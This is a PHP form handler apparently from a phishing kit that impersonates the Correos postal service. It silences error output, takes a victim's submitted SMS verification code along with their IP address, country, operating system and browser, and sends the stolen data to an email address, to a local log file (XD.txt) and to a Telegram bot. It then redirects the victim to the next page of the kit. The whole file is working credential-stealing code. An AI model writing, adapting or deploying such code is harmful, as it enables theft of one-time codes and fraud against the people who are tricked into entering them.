<?php
session_start();

error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
@ini_set('html_errors', '0');
@ini_set('display_errors', '0');
@ini_set('display_startup_errors', '0');
@ini_set('log_errors', '0');

include('../Conan/911.php');
include('../Conan/COUNTRY.php');
include('../Conan/SYS.php');
include('../Conan/TELEGRMAT.php');

if (isset($_POST['submit'])) {
    $message = "* +------+SMS-CORREOS+------+\n";
    $message .= "* CODE_SMS: " . $_POST['smsone'] . "\n";

    $message .= "* +------+INFO+------+\n";
    $message .= "* Country: #$get_user_country\n";
    $message .= "* IP Address: $ip\n";
    $message .= "* Operating System: $user_os\n";
    $message .= "* Browser: $user_browser\n";
    $message .= "* Time: $date\n";
    $message .= "* +------++------+\n";

    $subject = "+------+SMS_CODE-ArgentinaS+------+";
    $headers = "From: SMS@CORREOS.com\r\n";
    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
    mail($to, $subject, $message, $headers);

    $file = fopen('XD.txt', 'a');
    fwrite($file, $message . "\n");
    fclose($file);

    $data = [
        'text' => $message,
        'chat_id' => $chat_id,
    ];

    file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data));

    header('Location: ../D.php?Dsir=1#sHFHJHDHDHKJDJDSDSJDSJKJDSJDSDJJDSHYKJHGFG');
    exit;
}
?>